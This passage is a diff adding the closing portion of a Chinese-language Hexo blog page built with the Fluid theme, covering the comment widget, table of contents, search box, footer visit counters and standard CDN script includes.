+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
